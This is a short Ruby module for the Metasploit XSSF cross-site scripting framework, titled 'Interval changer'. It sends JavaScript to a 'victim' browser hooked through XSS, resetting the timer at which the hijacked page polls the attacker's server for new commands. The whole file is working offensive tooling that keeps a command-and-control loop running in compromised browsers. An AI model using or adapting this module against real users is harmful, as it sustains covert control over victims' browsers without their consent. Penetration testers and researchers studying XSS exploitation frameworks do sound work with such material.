require 'msf/core'
require 'xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Interval changer',
			'Description' => 'Changes the victim interval between command ask to server'
		))
		
		register_options(
			[
				OptInt.new('interval', [true, 'New Interval', 5])
			], self.class
		)
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		code = %Q{
			clearInterval(XSSF_LOOP);
			XSSF_LOOP = setInterval(XSSF_EXECUTE_LOOP, #{datastore['interval']} * 1000);	
		}
		send_response(cli, code)
	end
end